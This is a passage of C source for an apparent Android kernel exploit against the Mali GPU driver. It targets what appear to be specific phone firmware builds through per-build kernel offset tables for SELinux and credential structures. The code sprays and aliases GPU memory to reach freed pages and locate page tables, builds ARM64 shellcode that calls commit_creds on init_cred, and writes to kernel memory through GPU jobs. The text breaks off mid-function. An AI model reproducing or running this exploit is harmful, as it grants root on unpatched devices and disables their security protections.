#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include "stdbool.h"
#include <sys/system_properties.h>
#include <sys/syscall.h>

#include "mali.h"
#include "mali_base_jm_kernel.h"
#include "midgard.h"

#ifdef SHELL
/*
 * Diagnostics have to survive a device hang.  stdio buffering would lose the
 * last lines exactly when they matter most, and %n$-style formatting is not
 * worth the risk here, so every message is rendered once and handed to a
 * single write() on fd 1, which is what adb shell has attached to the log.
 */
#include <stdarg.h>
static void log_write(const char *fmt, ...) {
  char buf[512];
  va_list ap;
  va_start(ap, fmt);
  int n = vsnprintf(buf, sizeof(buf), fmt, ap);
  va_end(ap);
  if (n > 0) {
    size_t len = (size_t)n < sizeof(buf) ? (size_t)n : sizeof(buf) - 1;
    ssize_t off = 0;
    while ((size_t)off < len) {
      ssize_t w = write(1, buf + off, len - (size_t)off);
      if (w <= 0) break;
      off += w;
    }
  }
}
#define LOG(fmt, ...) log_write(fmt, ##__VA_ARGS__)
#else
#include <android/log.h>
#define LOG(fmt, ...) __android_log_print(ANDROID_LOG_ERROR, "exploit", fmt, ##__VA_ARGS__)

#endif //SHELL

#define MALI "/dev/mali0"			//check, may be different on other devices

#define PAGE_SHIFT 12

#define BASE_MEM_ALIAS_MAX_ENTS ((size_t)24576)

#define PFN_DOWN(x)	((x) >> PAGE_SHIFT)

#define SPRAY_PAGES 25

#define SPRAY_NUM 128

#define FLUSH_SIZE (0x1000 * 0x180)		//increasing = less 'out of memory' results but more crashes (default 0x1000 * 0x100)

#define SPRAY_CPU 0

#define POOL_SIZE 16384				//may be different on other devices

#define RESERVED_SIZE 32

#define TOTAL_RESERVED_SIZE 1024

#define FLUSH_REGION_SIZE 1024

#define NUM_TRIALS 100

#define KERNEL_BASE 0x1080000			//raven's kernel load address

#define OVERWRITE_INDEX 256

#define ADRP_INIT_INDEX 0

#define ADD_INIT_INDEX 1

#define ADRP_COMMIT_INDEX 2

#define ADD_COMMIT_INDEX 3

//offset values from Cube kallsyms, subtract head t _head
// PS7201/942
#define SELINUX_ENFORCING_7201_942 0x184d634
#define SEL_READ_ANCHOR_7201_942 0x3644b4
#define INIT_CRED_7201_942 0x15eb228
#define COMMIT_CREDS_7201_942 0x4cc70
#define ADD_INIT_7201_942 0x9108a000		//add x0, x0, #0x228
#define ADD_COMMIT_7201_942 0x9131c108		//add x8, x8, #0xc70

// PS7204/1044
#define SELINUX_ENFORCING_7204_1044 0x184d634
#define SEL_READ_ANCHOR_7204_1044 0x364438
#define INIT_CRED_7204_1044 0x15eb228
#define COMMIT_CREDS_7204_1044 0x4ccc0
#define ADD_INIT_7204_1044 0x9108a000		//add x0, x0, #0x228
#define ADD_COMMIT_7204_1044 0x91330108		//add x8, x8, #0xcc0

// PS7204/1046
#define SELINUX_ENFORCING_7204_1046 0x184d634
#define SEL_READ_ANCHOR_7204_1046 0x364438
#define INIT_CRED_7204_1046 0x15eb228
#define COMMIT_CREDS_7204_1046 0x4ccc0
#define ADD_INIT_7204_1046 0x9108a000		//add x0, x0, #0x228
#define ADD_COMMIT_7204_1046 0x91330108		//add x8, x8, #0xcc0

// PS7206/1098
#define SELINUX_ENFORCING_7206_1098 0x184d634
#define SEL_READ_ANCHOR_7206_1098 0x364438
#define INIT_CRED_7206_1098 0x15eb228
#define COMMIT_CREDS_7206_1098 0x4ccc0
#define ADD_INIT_7206_1098 0x9108a000		//add x0, x0, #0x228
#define ADD_COMMIT_7206_1098 0x91330108		//add x8, x8, #0xcc0

// PS7212/1333
#define SELINUX_ENFORCING_7212_1333 0x184d634
#define SEL_READ_ANCHOR_7212_1333 0x364304
#define INIT_CRED_7212_1333 0x15eb228
#define COMMIT_CREDS_7212_1333 0x4ccc0
#define ADD_INIT_7212_1333 0x9108a000		//add x0, x0, #0x228
#define ADD_COMMIT_7212_1333 0x91330108		//add x8, x8, #0xcc0

// PS7212/1335
#define SELINUX_ENFORCING_7212_1335 0x184d634
#define SEL_READ_ANCHOR_7212_1335 0x364304
#define INIT_CRED_7212_1335 0x15eb228
#define COMMIT_CREDS_7212_1335 0x4ccc0
#define ADD_INIT_7212_1335 0x9108a000		//add x0, x0, #0x228
#define ADD_COMMIT_7212_1335 0x91330108		//add x8, x8, #0xcc0

// PS7216/1582 (uncofirmed)
#define SELINUX_ENFORCING_7216_1582 0x184d634
#define SEL_READ_ANCHOR_7216_1582 0x364304
#define INIT_CRED_7216_1582 0x15eb228
#define COMMIT_CREDS_7216_1582 0x4ccc0
#define ADD_INIT_7216_1582 0x9108a000		//add x0, x0, #0x228
#define ADD_COMMIT_7216_1582 0x91330108		//add x8, x8, #0xcc0

// PS7224/1752
#define SELINUX_ENFORCING_7224_1752 0x185d634
#define SEL_READ_ANCHOR_7224_1752 0x3641dc
#define INIT_CRED_7224_1752 0x15fb228
#define COMMIT_CREDS_7224_1752 0x4ccc0
#define ADD_INIT_7224_1752 0x9108a000		//add x0, x0, #0x228
#define ADD_COMMIT_7224_1752 0x91330108		//add x8, x8, #0xcc0

// PS7229/1850
#define SELINUX_ENFORCING_7229_1850 0x185d634
#define SEL_READ_ANCHOR_7229_1850 0x3641bc
#define INIT_CRED_7229_1850 0x15fb228
#define COMMIT_CREDS_7229_1850 0x4ccc0
#define ADD_INIT_7229_1850 0x9108a000		//add x0, x0, #0x228
#define ADD_COMMIT_7229_1850 0x91330108		//add x8, x8, #0xcc0

// PS7229/1853
#define SELINUX_ENFORCING_7229_1853 0x185d634
#define SEL_READ_ANCHOR_7229_1853 0x3641bc
#define INIT_CRED_7229_1853 0x15fb228
#define COMMIT_CREDS_7229_1853 0x4ccc0
#define ADD_INIT_7229_1853 0x9108a000		//add x0, x0, #0x228
#define ADD_COMMIT_7229_1853 0x91330108		//add x8, x8, #0xcc0

// PS7229/1856
#define SELINUX_ENFORCING_7229_1856 0x185d634
#define SEL_READ_ANCHOR_7229_1856 0x3641bc
#define INIT_CRED_7229_1856 0x15fb228
#define COMMIT_CREDS_7229_1856 0x4ccc0
#define ADD_INIT_7229_1856 0x9108a000		//add x0, x0, #0x228
#define ADD_COMMIT_7229_1856 0x91330108		//add x8, x8, #0xcc0

// PS7234/2039 (unconfirmed)
#define SELINUX_ENFORCING_7234_2039 0x185d634
#define SEL_READ_ANCHOR_7234_2039 0x36383c
#define INIT_CRED_7234_2039 0x15fb228
#define COMMIT_CREDS_7234_2039 0x4ccc0
#define ADD_INIT_7234_2039 0x9108a000		//add x0, x0, #0x228
#define ADD_COMMIT_7234_2039 0x91330108		//add x8, x8, #0xcc0

// PS7234/2042 (unconfirmed)
#define SELINUX_ENFORCING_7234_2042 0x185d634
#define SEL_READ_ANCHOR_7234_2042 0x36383c
#define INIT_CRED_7234_2042 0x15fb228
#define COMMIT_CREDS_7234_2042 0x4ccc0
#define ADD_INIT_7234_2042 0x9108a000		//add x0, x0, #0x228
#define ADD_COMMIT_7234_2042 0x91330108		//add x8, x8, #0xcc0

// PS7242/2216
#define SELINUX_ENFORCING_7242_2216 0x185d634
#define SEL_READ_ANCHOR_7242_2216 0x3641ec
#define INIT_CRED_7242_2216 0x15fb228
#define COMMIT_CREDS_7242_2216 0x4ccc0
#define ADD_INIT_7242_2216 0x9108a000		//add x0, x0, #0x228
#define ADD_COMMIT_7242_2216 0x91330108		//add x8, x8, #0xcc0

// PS7242/2896 (unconfirmed)
#define SELINUX_ENFORCING_7242_2896 0x185d634
#define SEL_READ_ANCHOR_7242_2896 0x364158
#define INIT_CRED_7242_2896 0x15fb228
#define COMMIT_CREDS_7242_2896 0x4ccc0
#define ADD_INIT_7242_2896 0x9108a000		//add x0, x0, #0x228
#define ADD_COMMIT_7242_2896 0x91330108		//add x8, x8, #0xcc0

// PS7242/2906
#define SELINUX_ENFORCING_7242_2906 0x185d634
#define SEL_READ_ANCHOR_7242_2906 0x364158
#define INIT_CRED_7242_2906 0x15fb228
#define COMMIT_CREDS_7242_2906 0x4ccc0
#define ADD_INIT_7242_2906 0x9108a000		//add x0, x0, #0x228
#define ADD_COMMIT_7242_2906 0x91330108		//add x8, x8, #0xcc0

// PS7242/3515
#define SELINUX_ENFORCING_7242_3515 0x185d634
#define SEL_READ_ANCHOR_7242_3515 0x364158
#define INIT_CRED_7242_3515 0x15fb228
#define COMMIT_CREDS_7242_3515 0x4ccc0
#define ADD_INIT_7242_3515 0x9108a000		//add x0, x0, #0x228
#define ADD_COMMIT_7242_3515 0x91330108		//add x8, x8, #0xcc0

// PS7242/3516
#define SELINUX_ENFORCING_7242_3516 0x185d634
#define SEL_READ_ANCHOR_7242_3516 0x364158
#define INIT_CRED_7242_3516 0x15fb228
#define COMMIT_CREDS_7242_3516 0x4ccc0
#define ADD_INIT_7242_3516 0x9108a000		//add x0, x0, #0x228
#define ADD_COMMIT_7242_3516 0x91330108		//add x8, x8, #0xcc0

// PS7273/2625
#define SELINUX_ENFORCING_7273_2625 0x185d634
#define SEL_READ_ANCHOR_7273_2625 0x364158
#define INIT_CRED_7273_2625 0x15fb528
#define COMMIT_CREDS_7273_2625 0x4ccc0
#define ADD_INIT_7273_2625 0x9114a000		//add x0, x0, #0x528
#define ADD_COMMIT_7273_2625 0x91330108		//add x8, x8, #0xcc0

// PS7279/2766
#define SELINUX_ENFORCING_7279_2766 0x185d634
#define SEL_READ_ANCHOR_7279_2766 0x364158
#define INIT_CRED_7279_2766 0x15fb528
#define COMMIT_CREDS_7279_2766 0x4ccc0
#define ADD_INIT_7279_2766 0x9114a000		//add x0, x0, #0x528
#define ADD_COMMIT_7279_2766 0x91330108		//add x8, x8, #0xcc0

// PS7285/2877
#define SELINUX_ENFORCING_7285_2877 0x185d634
#define SEL_READ_ANCHOR_7285_2877 0x364158
#define INIT_CRED_7285_2877 0x15fb528
#define COMMIT_CREDS_7285_2877 0x4ccc0
#define ADD_INIT_7285_2877 0x9114a000		//add x0, x0, #0x528
#define ADD_COMMIT_7285_2877 0x91330108		//add x8, x8, #0xcc0

// PS7285/2880
#define SELINUX_ENFORCING_7285_2880 0x185d634
#define SEL_READ_ANCHOR_7285_2880 0x364158
#define INIT_CRED_7285_2880 0x15fb528
#define COMMIT_CREDS_7285_2880 0x4ccc0
#define ADD_INIT_7285_2880 0x9114a000		//add x0, x0, #0x528
#define ADD_COMMIT_7285_2880 0x91330108		//add x8, x8, #0xcc0

// PS7292/2982
#define SELINUX_ENFORCING_7292_2982 0x185d634
#define SEL_READ_ANCHOR_7292_2982 0x3641d4
#define INIT_CRED_7292_2982 0x15fb528
#define COMMIT_CREDS_7292_2982 0x4ccc0
#define ADD_INIT_7292_2982 0x9114a000		//add x0, x0, #0x528
#define ADD_COMMIT_7292_2982 0x91330108		//add x8, x8, #0xcc0

// PS7292/2984
#define SELINUX_ENFORCING_7292_2984 0x185d634
#define SEL_READ_ANCHOR_7292_2984 0x3641d4
#define INIT_CRED_7292_2984 0x15fb528
#define COMMIT_CREDS_7292_2984 0x4ccc0
#define ADD_INIT_7292_2984 0x9114a000		//add x0, x0, #0x528
#define ADD_COMMIT_7292_2984 0x91330108		//add x8, x8, #0xcc0

// PS7603/3110
#define SELINUX_ENFORCING_7603_3110 0x185d634
#define SEL_READ_ANCHOR_7603_3110 0x3641d4
#define INIT_CRED_7603_3110 0x15fb528
#define COMMIT_CREDS_7603_3110 0x4ccc0
#define ADD_INIT_7603_3110 0x9114a000		//add x0, x0, #0x528
#define ADD_COMMIT_7603_3110 0x91330108		//add x8, x8, #0xcc0

// PS7608/3614
#define SELINUX_ENFORCING_7608_3614 0x185d634
#define SEL_READ_ANCHOR_7608_3614 0x3641d4
#define INIT_CRED_7608_3614 0x15fb528
#define COMMIT_CREDS_7608_3614 0x4ccc0
#define ADD_INIT_7608_3614 0x9114a000		//add x0, x0, #0x528
#define ADD_COMMIT_7608_3614 0x91330108		//add x8, x8, #0xcc0

// PS7614/3227
#define SELINUX_ENFORCING_7614_3227 0x185d634
#define SEL_READ_ANCHOR_7614_3227 0x3641c4
#define INIT_CRED_7614_3227 0x15fb568
#define COMMIT_CREDS_7614_3227 0x4ccb0
#define ADD_INIT_7614_3227 0x9115a000		//add x0, x0, #0x568
#define ADD_COMMIT_7614_3227 0x9132c108		//add x8, x8, #0xcb0

// PS7624/3337
#define SELINUX_ENFORCING_7624_3337 0x185d634
#define SEL_READ_ANCHOR_7624_3337 0x3641c4 
#define INIT_CRED_7624_3337 0x15fb568
#define COMMIT_CREDS_7624_3337 0x4ccb0
#define ADD_INIT_7624_3337 0x9115a000		//add x0, x0, #0x568
#define ADD_COMMIT_7624_3337 0x9132c108		//add x8, x8, #0xcb0

// PS7633/3445
#define SELINUX_ENFORCING_7633_3445 0x185d634
#define SEL_READ_ANCHOR_7633_3445 0x3641d0
#define INIT_CRED_7633_3445 0x15fb568
#define COMMIT_CREDS_7633_3445 0x4ccb0
#define ADD_INIT_7633_3445 0x9115a000		//add x0, x0, #0x568
#define ADD_COMMIT_7633_3445 0x9132c108		//add x8, x8, #0xcb0


static uint64_t sel_read_anchor = SEL_READ_ANCHOR_7624_3337;
static uint64_t selinux_enforcing = SELINUX_ENFORCING_7624_3337;
static uint64_t avc_deny = 0;
/*
Overwriting SELinux to permissive
  strb wzr, [x0]
  mov x0, #0
  ret
*/
//static uint32_t permissive[3] = {0x3900001f, 0xd2800000,0xd65f03c0};

static uint32_t root_code[12] = {0};

static uint8_t jit_id = 1;
static uint8_t atom_number = 1;
static uint64_t gpu_va[SPRAY_NUM] = {0};
static uint8_t* gpu_regions[SPRAY_NUM] = {0};
static int gpu_va_idx = 0;
static void* flush_regions[FLUSH_REGION_SIZE];
static void* alias_regions[SPRAY_NUM] = {0};
static uint64_t reserved[TOTAL_RESERVED_SIZE/RESERVED_SIZE];


struct base_mem_handle {
	struct {
		__u64 handle;
	} basep;
};

struct base_mem_aliasing_info {
	struct base_mem_handle handle;
	__u64 offset;
	__u64 length;
};

static int open_dev(char* name) {
  int fd = open(name, O_RDWR);
  if (fd == -1) {
    err(1, "cannot open %s\n", name);
  }
  return fd;
}

void setup_mali(int fd, int group_id) {
  struct kbase_ioctl_version_check param = {0};
  if (ioctl(fd, KBASE_IOCTL_VERSION_CHECK, &param) < 0) {
    err(1, "version check failed\n");
  }
  //struct kbase_ioctl_set_flags set_flags = {group_id << 3};
  struct kbase_ioctl_set_flags set_flags = {0};
  if (ioctl(fd, KBASE_IOCTL_SET_FLAGS, &set_flags) < 0) {
    err(1, "set flags failed\n");
  } 
}


void* setup_tracking_page(int fd) {
  void* region = mmap(NULL, 0x1000, 0, MAP_SHARED, fd, BASE_MEM_MAP_TRACKING_HANDLE);
  if (region == MAP_FAILED) {
    err(1, "setup tracking page failed");
  }
  return region;
}


void jit_init(int fd, uint64_t va_pages, uint64_t trim_level, int group_id) {
  struct kbase_ioctl_mem_jit_init init = {0};
  init.va_pages = va_pages;
  init.max_allocations = 255;
  init.trim_level = trim_level;
  //init.group_id = group_id;
  //init.phys_pages = va_pages;

  if (ioctl(fd, KBASE_IOCTL_MEM_JIT_INIT, &init) < 0) {
    err(1, "jit init failed\n");
  }
}

uint64_t jit_allocate(int fd, uint8_t atom_number, uint8_t id, uint64_t va_pages, uint64_t gpu_alloc_addr, uint64_t* gpu_alloc_region) {
  struct base_jit_alloc_info info = {0};
  struct base_jd_atom_v2 atom = {0};
  
  info.id = id;
  info.gpu_alloc_addr = gpu_alloc_addr;
  info.va_pages = va_pages;
  info.commit_pages = va_pages;
  info.extension = 0x1000;

  atom.jc = (uint64_t)(&info);
  atom.atom_number = atom_number;
  atom.core_req = BASE_JD_REQ_SOFT_JIT_ALLOC;
  atom.nr_extres = 1;
  struct kbase_ioctl_job_submit submit = {0};
  submit.addr = (uint64_t)(&atom);
  submit.nr_atoms = 1;
  submit.stride = sizeof(struct base_jd_atom_v2);
  if (ioctl(fd, KBASE_IOCTL_JOB_SUBMIT, &submit) < 0) {
    err(1, "submit JIT_ALLOC job failed id=%u\n", id);
  }
  uint64_t jit_addr = *((uint64_t*)gpu_alloc_region);
  LOG("jit_allocate id=%u addr=%llx\n", id, jit_addr);
  if (jit_addr == 0)
    errx(1, "JIT_ALLOC returned null id=%u", id);
  return jit_addr;
}

void jit_free(int fd, uint8_t atom_number, uint8_t id) {
  uint8_t free_id = id;

  struct base_jd_atom_v2 atom = {0};

  atom.jc = (uint64_t)(&free_id);
  atom.atom_number = atom_number;
  atom.core_req = BASE_JD_REQ_SOFT_JIT_FREE;
  atom.nr_extres = 1;
  struct kbase_ioctl_job_submit submit = {0};
  submit.addr = (uint64_t)(&atom);
  submit.nr_atoms = 1;
  submit.stride = sizeof(struct base_jd_atom_v2);
  if (ioctl(fd, KBASE_IOCTL_JOB_SUBMIT, &submit) < 0) {
    err(1, "submit JIT_FREE job failed id=%u\n", id);
  }
  LOG("jit_free_submitted id=%u\n", id);
}

void mem_flags_change(int fd, uint64_t gpu_addr, uint32_t flags, int ignore_results) {
  struct kbase_ioctl_mem_flags_change change = {0};
  change.flags = flags;
  change.gpu_va = gpu_addr;
  change.mask = flags;
  if (ignore_results) {
    ioctl(fd, KBASE_IOCTL_MEM_FLAGS_CHANGE, &change);
    return;
  }
  if (ioctl(fd, KBASE_IOCTL_MEM_FLAGS_CHANGE, &change) < 0) {
    err(1, "flags_change failed gpu_va=%llx flags=%x mask=%x\n",
        change.gpu_va, change.flags, change.mask);
  }
}

void mem_alloc(int fd, union kbase_ioctl_mem_alloc* alloc) {
  if (ioctl(fd, KBASE_IOCTL_MEM_ALLOC, alloc) < 0) {
    err(1, "mem_alloc failed\n");
  }
}

void mem_alias(int fd, union kbase_ioctl_mem_alias* alias) {
  if (ioctl(fd, KBASE_IOCTL_MEM_ALIAS, alias) < 0) {
    err(1, "mem_alias failed\n");
  }
}

void mem_query(int fd, union kbase_ioctl_mem_query* query) {
  if (ioctl(fd, KBASE_IOCTL_MEM_QUERY, query) < 0) {
    err(1, "mem_query failed\n");
  }
}

void mem_commit(int fd, uint64_t gpu_addr, uint64_t pages) {
  struct kbase_ioctl_mem_commit commit = {.gpu_addr = gpu_addr, pages = pages};
  if (ioctl(fd, KBASE_IOCTL_MEM_COMMIT, &commit) < 0) {
    err(1, "mem_commit failed\n");
  }
}

uint64_t map_gpu(int mali_fd, unsigned int va_pages, unsigned int commit_pages, bool read_only, int group) {
  union kbase_ioctl_mem_alloc alloc = {0};
  alloc.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_CPU_WR; //| (group << 22);
  int prot = PROT_READ;
  if (!read_only) {
    alloc.in.flags |= BASE_MEM_PROT_GPU_WR;
    prot |= PROT_WRITE;
  }
  alloc.in.va_pages = va_pages;
  alloc.in.commit_pages = commit_pages;
  mem_alloc(mali_fd, &alloc);
  return alloc.out.gpu_va;
}

uint64_t alloc_mem(int mali_fd, unsigned int pages) {
  union kbase_ioctl_mem_alloc alloc = {0};
  alloc.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_CPU_WR | BASE_MEM_PROT_GPU_WR;
  int prot = PROT_READ | PROT_WRITE;
  alloc.in.va_pages = pages;
  alloc.in.commit_pages = pages;
  mem_alloc(mali_fd, &alloc);
  return alloc.out.gpu_va;
}

void free_mem(int mali_fd, uint64_t gpuaddr) {
  struct kbase_ioctl_mem_free mem_free = {.gpu_addr = gpuaddr};
  if (ioctl(mali_fd, KBASE_IOCTL_MEM_FREE, &mem_free) < 0) {
    err(1, "free_mem failed\n");
  }
}

uint64_t drain_mem_pool(int mali_fd) {
  union kbase_ioctl_mem_alloc alloc = {0};
  alloc.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_CPU_WR | BASE_MEM_PROT_GPU_WR; // | (1 << 22);
  int prot = PROT_READ | PROT_WRITE;
  alloc.in.va_pages = POOL_SIZE;
  alloc.in.commit_pages = POOL_SIZE;
  mem_alloc(mali_fd, &alloc);
  return alloc.out.gpu_va;
}

void release_mem_pool(int mali_fd, uint64_t drain) {
  struct kbase_ioctl_mem_commit commit = {.gpu_addr = drain, .pages = 0};
  if (ioctl(mali_fd, KBASE_IOCTL_MEM_COMMIT, &commit) < 0) {
    err(1, "mem_commit failed\n");
  }
}

/*
void release_mem_pool(int mali_fd, uint64_t drain) {
  struct kbase_ioctl_mem_free mem_free = {.gpu_addr = drain};
  if (ioctl(mali_fd, KBASE_IOCTL_MEM_FREE, &mem_free) < 0) {
    err(1, "free_mem failed\n");
  }
}
*/

#define CPU_SETSIZE 1024
#define __NCPUBITS  (8 * sizeof (unsigned long))
typedef struct
{
   unsigned long __bits[CPU_SETSIZE / __NCPUBITS];
} cpu_set_t;

#define CPU_SET(cpu, cpusetp) \
  ((cpusetp)->__bits[(cpu)/__NCPUBITS] |= (1UL << ((cpu) % __NCPUBITS)))
#define CPU_ZERO(cpusetp) \
  memset((cpusetp), 0, sizeof(cpu_set_t))

int migrate_to_cpu(int i)
{
    int syscallres;
    pid_t pid = gettid();
    cpu_set_t cpu;
    CPU_ZERO(&cpu);
    CPU_SET(i, &cpu);

    syscallres = syscall(__NR_sched_setaffinity, pid, sizeof(cpu), &cpu);
    if (syscallres)
    {
        return -1;
    }
    return 0;
}

void* flush(int spray_cpu, int idx) {
  migrate_to_cpu(spray_cpu);
  void* region = mmap(NULL, FLUSH_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
  if (region == MAP_FAILED) err(1, "flush failed");
  memset(region, idx, FLUSH_SIZE);
  return region;
}

void reserve_pages(int mali_fd, int pages, int nents, uint64_t* reserved_va) {
  for (int i = 0; i < nents; i++) {
    union kbase_ioctl_mem_alloc alloc = {0};
    alloc.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_CPU_WR | BASE_MEM_PROT_GPU_WR; // | (1 << 22);
    int prot = PROT_READ | PROT_WRITE;
    alloc.in.va_pages = pages;
    alloc.in.commit_pages = pages; //alloc.in.commit_pages = 0;
    mem_alloc(mali_fd, &alloc);
    reserved_va[i] = alloc.out.gpu_va;
  }
}

void map_reserved(int mali_fd, int pages, int nents, uint64_t* reserved_va) {
  for (int i = 0; i < nents; i++) {
    mem_commit(mali_fd, reserved_va[i], pages);
  }
}

uint64_t alias_sprayed_regions(int mali_fd) {
  union kbase_ioctl_mem_alias alias = {0};
  alias.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_CPU_WR | BASE_MEM_PROT_GPU_WR;
  alias.in.stride = SPRAY_PAGES;

  alias.in.nents = SPRAY_NUM;
  struct base_mem_aliasing_info ai[SPRAY_NUM];
  for (int i = 0; i < SPRAY_NUM; i++) {
    ai[i].handle.basep.handle = gpu_va[i];
    ai[i].length = SPRAY_PAGES;
    ai[i].offset = 0;
  }
  alias.in.aliasing_info = (uint64_t)(&(ai[0]));
  mem_alias(mali_fd, &alias);
  printf("alias gpu va %llx\n", alias.out.gpu_va);
/*
  uint64_t region_size = 0x1000 * SPRAY_NUM * SPRAY_PAGES;
  void* region = mmap64(NULL, region_size, PROT_READ, MAP_SHARED, mali_fd, alias.out.gpu_va);
  if (region == MAP_FAILED) {
    err(1, "mmap alias failed");
  }
  alias_regions[0] = region;
*/
  for (int i = 0; i < SPRAY_NUM; i++) {
    /*
     * Read-only: kbase rejects PROT_WRITE on an aliased allocation, so the
     * read primitive installs descriptors through a MALI_WRITE_VALUE job
     * instead of through this mapping.
     */
    void* this_region = mmap64(NULL, 0x1000 * SPRAY_PAGES, PROT_READ, MAP_SHARED, mali_fd,  (uint64_t)alias.out.gpu_va + i * 0x1000 * SPRAY_PAGES);
    if (this_region == MAP_FAILED) {
      err(1, "mmap alias failed %d\n", i);
    }
    alias_regions[i] = this_region;
  }
  // return (uint64_t)(alias_regions[0]);
  return (uint64_t)alias.out.gpu_va;
}

void fault_pages() {
  int read = 0;
  for (int va = 0; va < SPRAY_NUM; va++) {
    uint8_t* this_va = (uint8_t*)(gpu_regions[va]);
    *this_va = 0;
    uint8_t* this_alias = alias_regions[va];
    read += *this_alias;
  }
  LOG("read %d\n", read);
}

int find_freed_idx(int mali_fd) {
  int freed_idx = -1;
  for (int j = 0; j < SPRAY_NUM; j++) {
    union kbase_ioctl_mem_query query = {0};
    query.in.gpu_addr = gpu_va[j];
    query.in.query = KBASE_MEM_QUERY_COMMIT_SIZE;
    if (ioctl(mali_fd, KBASE_IOCTL_MEM_QUERY, &query) < 0) {err(1, "mem query error in find_freed_idx %d\n", j);}
    if (query.out.value != SPRAY_PAGES) {
      LOG("jit_free commit: %d %llu\n", j, query.out.value);
      freed_idx = j;
    }
  }
  return freed_idx;
}

/*
 * Locate the page of the aliased region that holds a live table: an entry with
 * the descriptor bits a resident page carries is enough to tell a table from
 * one of the zero pages the reclaim left behind.
 */
int find_pgd(int freed_idx, int start_pg) {
  uint64_t *this_alias = alias_regions[freed_idx];
  for (int pg = start_pg; pg < SPRAY_PAGES; pg++) {
    for (int i = 0; i < 0x1000 / 8; i++) {
      uint64_t entry = this_alias[pg * 0x1000 / 8 + i];
      if ((entry & 0x443) == 0x443)
        return pg;
    }
  }
  return -1;
}

uint32_t lo32(uint64_t x) {
  return x & 0xffffffff;
}

uint32_t hi32(uint64_t x) {
  return x >> 32;
}

uint32_t write_adrp(int rd, uint64_t pc, uint64_t label) {
  uint64_t pc_page = pc >> 12;
  uint64_t label_page = label >> 12;
  int64_t offset = (label_page - pc_page) << 12;
  int64_t immhi_mask = 0xffffe0;
  int64_t immhi = offset >> 14;
  int32_t immlo = (offset >> 12) & 0x3;
  uint32_t adpr = rd & 0x1f;
  adpr |= (1 << 28);
  adpr |= (1 << 31); //op
  adpr |= immlo << 29;
  adpr |= (immhi_mask & (immhi << 5));
  return adpr;
}

void fixup_root_shell(uint64_t init_cred, uint64_t commit_cred, uint64_t read_anchor, uint32_t add_init, uint32_t add_commit) {

  uint32_t init_adpr = write_adrp(0, read_anchor, init_cred);
  //Sets x0 to init_cred
  root_code[ADRP_INIT_INDEX] = init_adpr;
  root_code[ADD_INIT_INDEX] = add_init;
  //Sets x8 to commit_creds
  root_code[ADRP_COMMIT_INDEX] = write_adrp(8, read_anchor, commit_cred);
  root_code[ADD_COMMIT_INDEX] = add_commit;
  /*
   * The caller's arguments are live in x0..x3 at the point the handler is
   * entered, and the read path continues with them after the call, so the
   * frame saves them alongside the link registers and restores them before
   * returning.
   */
  root_code[4] = 0xa9bf07e0; // stp x0, x1, [sp, #-0x10]!
  root_code[5] = 0xa9be0fe2; // stp x2, x3, [sp, #-0x20]!
  root_code[6] = 0xa9bd7bfd; // stp x29, x30, [sp, #-0x30]!
  root_code[7] = 0xd63f0100; // blr x8
  root_code[8] = 0xa8c37bfd; // ldp x29, x30, [sp], #0x30
  root_code[9] = 0xa8c20fe2; // ldp x2, x3, [sp], #0x20
  root_code[10] = 0xa8c107e0; // ldp x0, x1, [sp], #0x10
  root_code[11] = 0xd65f03c0; // ret
}

uint64_t set_addr_lv3(uint64_t addr) {
  uint64_t pfn = addr >> PAGE_SHIFT;
  pfn &= ~ 0x1FFUL;
  pfn |= 0x100UL;
  return pfn << PAGE_SHIFT;
}

static inline uint64_t compute_pt_index(uint64_t addr, int level) {
  uint64_t vpfn = addr >> PAGE_SHIFT;
  vpfn >>= (3 - level) * 9;
  return vpfn & 0x1FF;
}

void write_to(int mali_fd, uint64_t gpu_addr, uint64_t value, int atom_number, enum mali_write_value_type type) {
  uint64_t jc_region = map_gpu(mali_fd, 1, 1, false, 0);
  struct MALI_JOB_HEADER jh = {0};
  jh.is_64b = true;
  jh.type = MALI_JOB_TYPE_WRITE_VALUE;
  
  struct MALI_WRITE_VALUE_JOB_PAYLOAD payload = {0};
  payload.type = type;
  payload.immediate_value = value;
  payload.address = gpu_addr;

  uint32_t* section = (uint32_t*)mmap64(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mali_fd, jc_region);
  if (section == MAP_FAILED) {
    err(1, "mmap failed");
  }

  MALI_JOB_HEADER_pack((uint32_t*)section, &jh);
  MALI_WRITE_VALUE_JOB_PAYLOAD_pack((uint32_t*)section + 8, &payload);
  struct base_jd_atom_v2 atom = {0};
  atom.jc = (uint64_t)jc_region;
  atom.atom_number = atom_number;
  atom.core_req = BASE_JD_REQ_CS;
  struct kbase_ioctl_job_submit submit = {0};
  submit.addr = (uint64_t)(&atom);
  submit.nr_atoms = 1;
  submit.stride = sizeof(struct base_jd_atom_v2);
  LOG("WRITE_TO enter addr=%llx val=%llx atom=%d\n", gpu_addr, value, atom_number);
  if (ioctl(mali_fd, KBASE_IOCTL_JOB_SUBMIT, &submit) < 0) {
    err(1, "submit job failed\n");
  }
  LOG("WRITE_TO ok atom=%d\n", atom_number);
  usleep(10000);
}

void write_data(int mali_fd, uint64_t data, uint64_t* reserved, uint64_t size, uint64_t value, enum mali_write_value_type type) {
  uint64_t data_offset = (data + KERNEL_BASE) % 0x1000;
  uint64_t curr_overwrite_addr = 0;
  for (int i = 0; i < size; i++) {
    uint64_t base = reserved[i];
    uint64_t end = reserved[i] + RESERVED_SIZE * 0x1000;
    uint64_t start_idx = compute_pt_index(base, 3);
    uint64_t end_idx = compute_pt_index(end, 3);
    for (uint64_t addr = base; addr < end; addr += 0x1000) {
      uint64_t overwrite_addr = set_addr_lv3(addr);
      if (curr_overwrite_addr != overwrite_addr) {
        LOG("write_data region=%d addr=%llx target=%llx data_offset=%llx\n",
            i, addr, overwrite_addr + data_offset, data_offset);
